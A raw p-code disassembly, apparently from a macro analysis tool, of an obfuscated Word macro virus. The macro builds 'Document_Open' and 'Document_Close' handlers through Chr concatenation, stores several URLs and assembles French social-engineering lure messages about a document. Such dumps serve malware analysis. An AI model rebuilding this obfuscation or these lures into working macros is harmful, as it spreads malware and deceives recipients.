' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St k7 
' 	BoS 0x0000 
' 	Ld k7 
' 	LitDI2 0x0043 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0028 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0029 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St k7 
' 	BoS 0x0000 
' 	LitDI2 0x0044 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St e8 
' 	QuoteRem 0x0110 0x000D " tkhsypqynhxn"
' Line #128:
' 	LineCont 0x0004 1D 00 00 00
' 	Ld e8 
' 	LitDI2 0x005F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0028 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0029 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St e8 
' 	BoS 0x0000 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0012 "http://sn.agat.net"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St b9 
' 	QuoteRem 0x0041 0x0009 " zrhmceep"
' Line #129:
' 	LineCont 0x0008 02 00 00 00 15 00 00 00
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0022 "http://altern.org/gigm/service.htm"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St a7 
' 	BoS 0x0000 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x001B "http://www.donquichotte.com"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St d6 
' 	BoS 0x0000 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0020 "http://www.multimania.com/antisn"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St c5 
' 	QuoteRem 0x0065 0x0009 " ygjrsyst"
' Line #130:
' 	LineCont 0x0010 02 00 00 00 22 00 00 00 31 00 00 00 33 00 00 00
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0003 "Oui"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "à"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "l"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "Emploi,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "Oui"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "à"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "l"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "armée"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St e2 
' 	BoS 0x0000 
' 	Ld e2 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "métier,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "mais"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "Non"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "au"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "service"
' 	Add 
' 	St e2 
' 	QuoteRem 0x008E 0x0006 " gcugp"
' Line #131:
' 	LineCont 0x0004 19 00 00 00
' 	Ld e2 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "national"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "sous"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "contrat"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "travail,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St e2 
' 	QuoteRem 0x0030 0x0005 " juca"
' Line #132:
' 	Ld e2 
' 	LitStr 0x0003 "Non"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "à"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "l"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000A "absurdité."
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St e2 
' 	QuoteRem 0x0053 0x0009 " gfhuypos"
' Line #133:
' 	LineCont 0x0018 1C 00 00 00 45 00 00 00 99 00 00 00 9B 00 00 00 B1 00 00 00 D0 00 00 00
' 	LitStr 0x0002 "Un"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "peu"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "d"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "aide..."
' 	Add 
' 	St g1 
' 	BoS 0x0000 
' 	LitStr 0x0002 "Je"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "dois"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "avouer"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "que"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "j"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "ai"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "un"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "peu"
' 	Add 
' 	St l3 
' 	BoS 0x0000 
' 	Ld l3 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "mal"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "à"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "peaufiner"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "ce"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "document"
' 	Add 
' 	St l3 
' 	BoS 0x0000 
' 	Ld l3 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "("
' 	Add 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0002 ")."
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "Merci"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "m"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "aider"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St l3 
' 	BoS 0x0000 
' 	Ld l3 
' 	LitStr 0x0002 "un"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "peu"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "pour"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "l"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000C "améliorer..."
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St l3 
' 	BoS 0x0000 
' 	LitStr 0x0007 "Version"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "finale"
' 	Add 
' 	St l9 
' 	QuoteRem 0x002D 0x000A " eytbegjwz"
' Line #134:
' 	LineCont 0x000C 38 00 00 00 39 00 00 00 4B 00 00 00
' 	LitStr 0x0005 "Voici"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "la"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "dernière"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "version"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "ce"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St n2 
' 	BoS 0x0000 
' 	Ld n2 
' 	LitStr 0x0003 "sur"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "quoi"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "j"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "ai"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "travaillé"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "ces"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "derniers"
' 	Add 
' 	St n2 
' 	QuoteRem 0x0037 0x0009 " sjhwivhc"
' Line #135:
' 	Ld n2 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "temps"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "("
' 	Add 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0002 ")."
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "Tous"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "les"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St n2 
' 	QuoteRem 0x0078 0x000C " kdrfviwspng"
' Line #136:
' 	Ld n2 
' 	LitStr 0x0004 "avis"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "sont"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "la"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "bienvenue"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "!"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St n2 
' 	QuoteRem 0x0067 0x000A " siaimrfks"
' Line #137:
' 	LitStr 0x0008 "Document"
' 	St m1 
' 	QuoteRem 0x0010 0x0008 " hiexkqr"
' Line #138:
' 	LineCont 0x000C 2E 00 00 00 37 00 00 00 39 00 00 00
' 	LitStr 0x0002 "Le"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "mystère"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "du"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "jour"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "à"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "résoudre"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "est"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St h8 
' 	BoS 0x0000 
' 	Ld h8 
' 	LitStr 0x0002 "le"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "suivant:"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St h8 
' 	BoS 0x0000 
' 	EndSub 
' 	QuoteRem 0x0032 0x000C " drynbkorfly"
' Line #139:
' 	FuncDefn (Private Sub f2())
' 	QuoteRem 0x0011 0x0009 " gtmlivme"
' Line #140:
' 	LineCont 0x0008 0F 00 00 00 19 00 00 00
' 	LitStr 0x0004 "Lors"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "son"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000C "intervention"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "télévisée"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "du"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "22"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St l5 
' 	QuoteRem 0x0042 0x000C " rnnundnnhjq"
' Line #141:
' 	LineCont 0x0018 04 00 00 00 22 00 00 00 3F 00 00 00 80 00 00 00 90 00 00 00 A3 00 00 00
' 	Ld l5 
' 	LitStr 0x0007 "février"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "1996,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "Jacques"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "Chirac,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "Président"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "la"
' 	Add 
' 	St l5 
' 	BoS 0x0000 
' 	Ld l5 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000A "République"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "et"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "Chef"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "des"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "Armées,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "a"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "proclamé:"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St l5 
' 	BoS 0x0000 
' 	LitStr 0x0005 ""Nous"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "n"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "avons"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "plus"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "besoin"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "d"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000A "appelés..."
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "(Le"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "service"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St i1 
' 	QuoteRem 0x0016 0x000D " vlmmaxbzcfvr"
' Line #142:
' 	LineCont 0x0008 22 00 00 00 35 00 00 00
' 	Ld i1 
' 	LitStr 0x0009 "national)"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "est"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "devenu"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "inégal"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "et"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "il"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "n"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "est"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "plus"
' 	Add 
' 	St i1 
' 	QuoteRem 0x0019 0x0010 " mpwzufucwrmcafy"
' Line #143:
' 	LineCont 0x0004 03 00 00 00
' 	Ld i1 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000B "universel.""
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "Le"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "Service"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "National"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "a"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "ensuite"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "été"
' 	Add 
' 	St i1 
' 	QuoteRem 0x0091 0x0009 " teatpcdg"
' Line #144:
' 	LineCont 0x0004 19 00 00 00
' 	Ld i1 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "supprimé"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "pour"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "tous..."
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "ou"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "presque:"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St i1 
' 	QuoteRem 0x0030 0x000A " dgtfqbzxp"
' Line #145:
' 	LineCont 0x0008 0F 00 00 00 33 00 00 00
' 	LitStr 0x0005 "Alors"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "qu"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "il"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "n"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "est"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "plus"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000B "obligatoire"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "pour"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "les"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "gens"
' 	Add 
' 	St i7 
' 	QuoteRem 0x002C 0x000E " ofkholjpijasy"
' Line #146:
' 	LineCont 0x000C 53 00 00 00 71 00 00 00 BC 00 00 00
' 	Ld i7 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "nés"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "après"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "1979,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "les"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "gens"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "nés"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "avant"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St i7 
' 	BoS 0x0000 
' 	Ld i7 
' 	LitStr 0x0004 "1979"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "peuvent"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "encore"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "perdre"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "emploi,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000C "appartement,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "vie"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St i7 
' 	BoS 0x0000 
' 	Ld i7 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "famille"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "sur"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "simple"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "ordre"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "du"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "Service"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "National."
' 	Add 
' 	St i7 
' 	BoS 0x0000 
' 	LitStr 0x0002 "En"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "réalité,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "la"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "situation"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "actuelle"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "est"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "bien"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
